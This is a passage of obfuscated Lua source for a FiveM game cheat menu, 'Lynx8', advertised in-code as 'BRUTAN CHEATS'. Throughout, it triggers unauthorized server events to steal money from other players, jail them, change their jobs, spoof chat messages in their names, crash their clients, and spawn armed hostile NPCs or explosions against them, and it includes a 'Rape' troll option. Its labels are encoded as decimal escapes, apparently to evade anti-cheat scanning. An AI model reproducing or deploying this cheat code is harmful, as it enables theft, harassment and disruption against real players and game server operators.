                        '\126\104\126\83\117\112\101\114\32\74\117\109\112',
                        SuperJump,
                        function(dl)
                            SuperJump = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\78\111\99\108\105\112',
                        Noclip,
                        function(dl)
                            Noclip = dl
                        end
                    )
                 then
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\103\126\69\118\97\100\101\32\126\115\126\70\114\111\109\32\74\97\105\108'
                    )
                 then
                    local dm = PlayerPedId(-1)
                    TriggerServerEvent(
                        '\101\115\120\45\113\97\108\108\101\45\106\97\105\108\58\106\97\105\108\80\108\97\121\101\114',
                        GetPlayerServerId(dm),
                        0,
                        'escaperino'
                    )
                    TriggerServerEvent(
                        '\101\115\120\95\106\97\105\108\101\114\58\115\101\110\100\84\111\74\97\105\108',
                        GetPlayerServerId(dm),
                        0
                    )
                    TriggerServerEvent(
                        '\101\115\120\95\106\97\105\108\58\115\101\110\100\84\111\74\97\105\108',
                        GetPlayerServerId(dm),
                        0
                    )
                    TriggerServerEvent(
                        '\106\115\58\106\97\105\108\117\115\101\114',
                        GetPlayerServerId(dm),
                        0,
                        'escaperino'
                    )
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117') then
                for i = 0, 128 do
                    if
                        NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and
                            Lynx8.MenuButton(
                                GetPlayerName(i) ..
                                    ' ~p~[' ..
                                        GetPlayerServerId(i) ..
                                            ']~s~ ~y~[' ..
                                                i ..
                                                    ']~s~ ' ..
                                                        (IsPedDeadOrDying(GetPlayerPed(i), 1) and '~h~~r~DEAD' or
                                                            '~h~~g~ALIVE'),
                                'PlayerOptionsMenu'
                            )
                     then
                        SelectedPlayer = i
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117') then
                Lynx8.SetSubTitle(
                    '\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117',
                    'Player Options [' .. GetPlayerName(SelectedPlayer) .. ']'
                )
                if
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\69\83\88\32\84\114\105\103\103\101\114\115',
                        '\69\83\88\84\114\105\103\103\101\114\105\110\105'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\69\83\88\32\74\111\98\115',
                        '\69\83\88\74\111\98\115\50'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\86\82\80\32\84\114\105\103\103\101\114\115',
                        '\86\82\80\80\108\97\121\101\114\84\114\105\103\103\101\114\115'
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '\126\104\126\126\112\126\45\62\32\126\115\126\84\114\111\108\108\32\77\101\110\117',
                        '\84\114\111\108\108\109\101\110\117'
                    )
                 then
                elseif Lynx8.Button('\126\104\126\126\103\126\82\101\118\105\118\101\47\72\101\97\108') then
                    CreatePickup(GetHashKey('PICKUP_HEALTH_STANDARD'), GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                elseif Lynx8.Button('\126\104\126\126\98\126\71\105\118\101\32\65\114\109\111\117\114') then
                    CreatePickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                elseif Lynx8.Button('\126\104\126\83\112\101\99\116\97\116\101', c3 and '~g~[SPECTATING]') then
                    SpectatePlayer(SelectedPlayer)
                elseif Lynx8.Button('\126\104\126\84\101\108\101\112\111\114\116\32\84\111') then
                    local cP = KeyboardInput('Are you sure? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    elseif cP == 'n' then
                        drawNotification(
                            '\126\104\126\126\114\126\79\112\101\114\97\116\105\111\110\32\99\97\110\99\101\108\108\101\100\126\115\126\46'
                        )
                    else
                        drawNotification(
                            '\126\104\126\126\114\126\73\110\118\97\108\105\100\32\67\111\110\102\105\114\109\97\116\105\111\110\126\115\126\46'
                        )
                        drawNotification(
                            '\126\104\126\126\114\126\79\112\101\114\97\116\105\111\110\32\99\97\110\99\101\108\108\101\100\126\115\126\46'
                        )
                    end
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\70\114\101\101\122\101\32\80\108\97\121\101\114',
                        freezeplayer,
                        function(dl)
                            freezeplayer = dl
                        end
                    )
                 then
                elseif
                    Lynx8.MenuButton(
                        '~h~~p~-> ~s~Give Single Weapon',
                        '\71\105\118\101\83\105\110\103\108\101\87\101\97\112\111\110\80\108\97\121\101\114'
                    )
                 then
                elseif
                    Lynx8.Button('\126\104\126\71\105\118\101\32\126\114\126\65\108\108\32\87\101\97\112\111\110\115')
                 then
                    for i = 1, #a_ do
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(a_[i]), 1000, false, false)
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\82\101\109\111\118\101\32\126\114\126\65\108\108\32\87\101\97\112\111\110\115'
                    )
                 then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif Lynx8.Button('\126\104\126\71\105\118\101\32\126\114\126\86\101\104\105\99\108\101') then
                    local ped = GetPlayerPed(SelectedPlayer)
                    local bT =
                        KeyboardInput(
                        '\69\110\116\101\114\32\86\101\104\105\99\108\101\32\83\112\97\119\110\32\78\97\109\101',
                        '',
                        100
                    )
                    if bT and IsModelValid(bT) and IsModelAVehicle(bT) then
                        RequestModel(bT)
                        while not HasModelLoaded(bT) do
                            Citizen.Wait(0)
                        end
                        local veh =
                            CreateVehicle(GetHashKey(bT), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
                    else
                        drawNotification(
                            '\126\114\126\77\111\100\101\108\32\105\115\32\110\111\116\32\118\97\108\105\100\33'
                        )
                    end
                elseif Lynx8.Button('\126\104\126\83\101\110\100\32\84\111\32\126\114\126\74\97\105\108') then
                    TriggerServerEvent(
                        '\101\115\120\45\113\97\108\108\101\45\106\97\105\108\58\106\97\105\108\80\108\97\121\101\114',
                        GetPlayerServerId(selectedPlayer),
                        5000,
                        '\74\97\105\108\101\100'
                    )
                    TriggerServerEvent(
                        '\101\115\120\95\106\97\105\108\101\114\58\115\101\110\100\84\111\74\97\105\108',
                        GetPlayerServerId(selectedPlayer),
                        45 * 60
                    )
                    TriggerServerEvent(
                        '\101\115\120\95\106\97\105\108\58\115\101\110\100\84\111\74\97\105\108',
                        GetPlayerServerId(selectedPlayer),
                        45 * 60
                    )
                    TriggerServerEvent(
                        '\106\115\58\106\97\105\108\117\115\101\114',
                        GetPlayerServerId(selectedPlayer),
                        45 * 60,
                        '\74\97\105\108\101\100'
                    )
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\103\126\69\118\97\100\101\32\126\115\126\70\114\111\109\32\74\97\105\108'
                    )
                 then
                    local dm = SelectedPlayer
                    TriggerServerEvent(
                        '\101\115\120\45\113\97\108\108\101\45\106\97\105\108\58\106\97\105\108\80\108\97\121\101\114',
                        GetPlayerServerId(dm),
                        0,
                        'escaperino'
                    )
                    TriggerServerEvent(
                        '\101\115\120\95\106\97\105\108\101\114\58\115\101\110\100\84\111\74\97\105\108',
                        GetPlayerServerId(dm),
                        0
                    )
                    TriggerServerEvent(
                        '\101\115\120\95\106\97\105\108\58\115\101\110\100\84\111\74\97\105\108',
                        GetPlayerServerId(dm),
                        0
                    )
                    TriggerServerEvent(
                        '\106\115\58\106\97\105\108\117\115\101\114',
                        GetPlayerServerId(dm),
                        0,
                        'escaperino'
                    )
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\69\83\88\84\114\105\103\103\101\114\105\110\105') then
                if Lynx8.Button('\126\104\126\126\103\126\82\101\118\105\118\101\32\80\108\97\121\101\114') then
                    TriggerEvent(
                        '\101\115\120\95\97\109\98\117\108\97\110\99\101\106\111\98\58\114\101\118\105\118\101',
                        GetPlayerServerId(SelectedPlayer)
                    )
                    TriggerEvent(
                        '\101\115\120\95\97\109\98\117\108\97\110\99\101\106\111\98\58\114\101\118\105\118\101',
                        SelectedPlayer
                    )
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\103\126\71\105\118\101\32\109\111\110\101\121\32\116\111\32\112\108\97\121\101\114\32\102\114\111\109\32\121\111\117\114\32\119\97\108\108\101\116'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121\32\116\111\32\103\105\118\101',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            'esx:giveInventoryItem',
                            GetPlayerServerId(SelectedPlayer),
                            '\105\116\101\109\95\109\111\110\101\121',
                            '\109\111\110\101\121',
                            f
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\83\116\101\97\108\32\109\111\110\101\121\32\102\114\111\109\32\97\32\112\108\97\121\101\114'
                    )
                 then
                    local f =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121\32\116\111\32\115\116\101\97\108',
                        '',
                        100
                    )
                    if f ~= '' then
                        TriggerServerEvent(
                            'esx:removeInventoryItem',
                            GetPlayerServerId(SelectedPlayer),
                            '\105\116\101\109\95\109\111\110\101\121',
                            '\109\111\110\101\121',
                            f
                        )
                    end
                elseif Lynx8.Button('\126\104\126\126\98\126\72\97\110\100\99\117\102\102\32\80\108\97\121\101\114') then
                    TriggerEvent(
                        '\101\115\120\95\112\111\108\105\99\101\106\111\98\58\104\97\110\100\99\117\102\102',
                        SelectedPlayer
                    )
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\86\82\80\80\108\97\121\101\114\84\114\105\103\103\101\114\115') then
                if
                    Lynx8.Button(
                        '\126\104\126\84\114\97\110\115\102\101\114\32\109\111\110\101\121\32\102\114\111\109\32\121\111\117\114\32\98\97\110\107'
                    )
                 then
                    local dn =
                        KeyboardInput(
                        '\69\110\116\101\114\32\97\109\111\117\110\116\32\111\102\32\109\111\110\101\121\32\116\111\32\103\105\118\101',
                        '',
                        100
                    )
                    local dp = KeyboardInput('\69\110\116\101\114\32\86\82\80\32\80\69\82\77\65\32\73\68\33', '', 100)
                    if dn ~= '' then
                        local cQ = GetPlayerServerId(PlayerId())
                        TriggerEvent('bank:transfer', cQ, GetPlayerServerId(SelectedPlayer), dn)
                        TriggerServerEvent('bank:transfer', dp, dn)
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\69\83\88\74\111\98\115\50') then
                if Lynx8.Button('\126\104\126\83\101\116\32\85\110\101\109\112\108\111\121\101\100') then
                    TriggerServerEvent(
                        '\78\66\58\100\101\115\116\105\116\117\101\114\112\108\97\121\101\114',
                        GetPlayerServerId(SelectedPlayer)
                    )
                    UnemployedPlayer(SelectedPlayer)
                elseif
                    Lynx8.Button('\126\104\126\83\101\116\32\126\98\126\80\111\108\105\99\101\32\126\115\126\74\111\98')
                 then
                    TriggerServerEvent(
                        '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                        GetPlayerServerId(SelectedPlayer),
                        '\112\111\108\105\99\101',
                        3
                    )
                    PolicePlayer(SelectedPlayer)
                elseif
                    Lynx8.Button('\126\104\126\83\101\116\32\126\111\126\77\101\99\97\110\111\32\126\115\126\74\111\98')
                 then
                    TriggerServerEvent(
                        '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                        GetPlayerServerId(SelectedPlayer),
                        '\109\101\99\97\110\111',
                        3
                    )
                    MecanoPlayer(SelectedPlayer)
                elseif Lynx8.Button('\126\104\126\83\101\116\32\126\121\126\84\97\120\105\32\126\115\126\74\111\98') then
                    TriggerServerEvent(
                        '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                        GetPlayerServerId(SelectedPlayer),
                        '\116\97\120\105',
                        3
                    )
                    TaxiPlayer(SelectedPlayer)
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\126\114\126\65\109\98\117\108\97\110\99\101\32\126\115\126\74\111\98'
                    )
                 then
                    TriggerServerEvent(
                        '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                        GetPlayerServerId(SelectedPlayer),
                        '\97\109\98\117\108\97\110\99\101',
                        3
                    )
                    AmbulancePlayer(SelectedPlayer)
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\126\103\126\82\101\97\108\32\69\115\116\97\116\101\32\126\115\126\74\111\98'
                    )
                 then
                    TriggerServerEvent(
                        '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                        GetPlayerServerId(SelectedPlayer),
                        '\114\101\97\108\101\115\116\97\116\101\97\103\101\110\116',
                        3
                    )
                    RealEstateAgentPlayer(SelectedPlayer)
                elseif
                    Lynx8.Button(
                        '\126\104\126\83\101\116\32\126\114\126\67\97\114\32\126\98\126\68\101\97\108\101\114\32\126\115\126\74\111\98'
                    )
                 then
                    TriggerServerEvent(
                        '\78\66\58\114\101\99\114\117\116\101\114\112\108\97\121\101\114',
                        GetPlayerServerId(SelectedPlayer),
                        '\99\97\114\100\101\97\108\101\114',
                        3
                    )
                    CarDealerPlayer(SelectedPlayer)
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\84\114\111\108\108\109\101\110\117') then
                if
                    Lynx8.Button(
                        '\126\104\126\126\114\126\70\97\107\101\32\126\115\126\67\104\97\116\32\77\101\115\115\97\103\101'
                    )
                 then
                    local dq = KeyboardInput('Enter message to send', '', 100)
                    local dr = GetPlayerName(SelectedPlayer)
                    if dq then
                        TriggerServerEvent('_chat:messageEntered', dr, {0, 0x99, 255}, dq)
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\75\105\99\107\32\126\115\126\70\114\111\109\32\86\101\104\105\99\108\101'
                    )
                 then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\121\126\69\120\112\108\111\100\101\32\126\115\126\86\101\104\105\99\108\101'
                    )
                 then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 18, 1337.0, false, true, 0.0)
                    else
                        drawNotification(
                            '\126\104\126\126\114\126\80\108\97\121\101\114\32\110\111\116\32\105\110\32\97\32\118\101\104\105\99\108\101\126\115\126\46'
                        )
                    end
                elseif Lynx8.Button('~h~Clone Car') then
                    ClonePedVeh()
                elseif Lynx8.Button('~h~Spawn Driveby') then
                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
                    local veh = vehlist[math.random(#vehlist)]
                    for i = 0, 1 do
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('s_m_y_swat_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_y_swat_01') do
                        RequestModel('s_m_y_swat_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        SetEntityInvincible(v, true)
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('s_m_y_swat_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_swat_01') then
                                Citizen.Wait(50)
                                local ped = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local ped1 =
                                    CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v, 0)
                                    TaskDriveBy(
                                        ped,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    TaskShootAtEntity(
                                        ped1,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(ped, SelectedPlayer, 0, 0)
                                    makePedHostile(ped1, SelectedPlayer, 0, 0)
                                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                                    TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                                    SetPlayerWeaponDamageModifier(ped, 500)
                                    SetPlayerWeaponDamageModifier(ped1, 500)
                                    for i = 1, 2 do
                                        Citizen.Wait(5)
                                    ClearPedTasks(GetPlayerPed(-1))
                                    end
                                end
                            end
                        end
                    end
                end
                elseif Lynx8.Button('~h~~r~Attempt Crash') then
                    if IsPedInAnyVehicle(GetVehiclePedIsIn(SelectedPlayer, 1), false) then
                        ClearPedTasksImmediately(SelectedPlayer)
                    end
                    drawNotification(SelectedPlayer .. ' Crash Attempt')
                    for i = 0, 64 do
                        if IsPedInAnyVehicle(GetVehiclePedIsIn(SelectedPlayer, 1), false) then
                            ClearPedTasksImmediately(SelectedPlayer)
                        end
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'BRUTAN CHEATS',
                            {0, 0x99, 255},
                            '/ooc BRUTAN ON YOUTUBE BEST FIVEM CHEATS>:D Player Crash Attempt'
                        )
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'BRUTAN CHEATS',
                            {0, 0x99, 255},
                            'BRUTAN ON YOUTUBE BEST FIVEM CHEATS  >:D Player Crash Attempt'
                        )
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey('s_m_y_swat_01'))
                        RequestModel(GetHashKey('ig_wade'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('s_m_y_swat_01')) then
                            local ped =
                                CreatePed(21, GetHashKey('s_m_y_swat_01'), coords.x, coords.y, coords.z, 0, true, false)
                            local ped1 =
                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and DoesEntityExist(ped1) then
                                --                SetEntityAsNoLongerNeeded(ped)
                                --               SetEntityAsNoLongerNeeded(ped1)
                                RequestNetworkControl(ped)
                                RequestNetworkControl(ped1)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_ASSAULTRIFLE'), 9999, 1, 1)
                                GiveWeaponToPed(ped1, GetHashKey('WEAPON_RPG'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                SetPedCanSwitchWeapon(ped1, true)
                                makePedHostile(ped, SelectedPlayer, 0, 0)
                                makePedHostile(ped1, SelectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                                TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                                TaskCombatHatedTargetsInArea(ped1, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                    end
                elseif Lynx8.Button('~h~Spawn Following Asshat') then
                    asshat = true
                    local target = GetPlayerPed(SelectedPlayer)
                    local assped = nil
                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
                    local veh = vehlist[math.random(#vehlist)]
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('s_m_y_hwaycop_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
                        RequestModel('s_m_y_hwaycop_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        v1 =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 10),
                            pos.y - (yf * 10),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(-1)),
                            1,
                            1
                        )
                        SetVehicleGravityAmount(v, 15.0)
                        SetVehicleGravityAmount(v1, 15.0)
                        SetEntityInvincible(v, true)
                        SetEntityInvincible(v1, true)
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('s_m_y_hwaycop_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('s_m_y_hwaycop_01') then
                                Citizen.Wait(50)
                                local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                assped = ped
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v1, -1)
                                    SetPedIntoVehicle(pas, v, 0)
                                    SetPedIntoVehicle(pas1, v1, 0)
                                    TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    asstarget = target
                                    TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                    SetDriverAbility(ped, 10.0)
                                    SetDriverAggressiveness(ped, 10.0)
                                    SetDriverAbility(ped1, 10.0)
                                    SetDriverAggressiveness(ped1, 10.0)
                                end
                            end
                        end
                end
                elseif Lynx8.Button('~h~Follow Player (BUGGY)') then
                    if Follow == false then
                        Follow = true
                        drawNotification('This is a button toggle, click again to disable')
                    elseif Follow == true then
                        Follow = false
                        drawNotification('This is a button toggle, click again to enable')
                    end
                elseif Lynx8.Button('~h~Spawn Swat ~r~AK') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey('s_m_y_swat_01'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('s_m_y_swat_01')) then
                            local ped =
                                CreatePed(21, GetHashKey('s_m_y_swat_01'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_ASSAULTRIFLE'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, SelectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                    end
                elseif Lynx8.Button('~h~Spawn Wade ~r~RPG') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey('ig_wade'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('ig_wade')) then
                            local ped =
                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_RPG'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, SelectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                    end
                elseif Lynx8.Button('\126\104\126\126\114\126\66\97\110\97\110\97\32\126\112\126\80\97\114\116\121') then
                    bananaparty()
                elseif Lynx8.Button('\126\104\126\126\114\126\69\120\112\108\111\100\101') then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 18, 3000.0, true, false, 1.0)
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 18, 3000.0, true, false, true)
                elseif Lynx8.Button('\126\104\126\126\114\126\82\97\112\101') then
                    rapeplayer()
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\84\101\108\101\112\111\114\116\77\101\110\117') then
                if
                    Lynx8.Button(
                        '\126\104\126\84\101\108\101\112\111\114\116\32\116\111\32\126\103\126\119\97\121\112\111\105\110\116'
                    )
                 then
                    bO()
                elseif
                    Lynx8.Button(
                        '\126\104\126\84\101\108\101\112\111\114\116\32\105\110\116\111\32\126\103\126\110\101\97\114\101\115\116\32\126\115\126\118\101\104\105\99\108\101'
                    )
                 then
                    bH()
                elseif
                    Lynx8.Button(
                        '\126\104\126\84\101\108\101\112\111\114\116\32\116\111\32\126\114\126\99\111\111\114\100\115'
                    )
                 then
                    bA()
                elseif
                    Lynx8.Button(
                        '\126\104\126\68\114\97\119\32\99\117\115\116\111\109\32\126\114\126\98\108\105\112\32\126\115\126\111\110\32\109\97\112'
                    )
                 then
                    bE()
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\83\104\111\119\32\126\103\126\67\111\111\114\100\115',
                        showCoords,
                        function(dl)
                            showCoords = dl
                        end
                    )
                 then
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\87\101\97\112\111\110\77\101\110\117') then
                if Lynx8.MenuButton('~h~~p~-> ~s~Give Single Weapon', '\87\101\97\112\111\110\84\121\112\101\115') then
                elseif
                    Lynx8.CheckBox(
                        '~h~Magic Bullet',
                        MagicBullet,
                        function(enabled)
                            MagicBullet = enabled
                        end
                    )
                 then
                elseif
                    Lynx8.Button('\126\104\126\126\103\126\71\105\118\101\32\65\108\108\32\87\101\97\112\111\110\115')
                 then
                    for i = 1, #a_ do
                        GiveWeaponToPed(PlayerPedId(-1), GetHashKey(a_[i]), 1000, false, false)
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\82\101\109\111\118\101\32\65\108\108\32\87\101\97\112\111\110\115'
                    )
                 then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
                elseif Lynx8.Button('~h~Drop your current Weapon') then
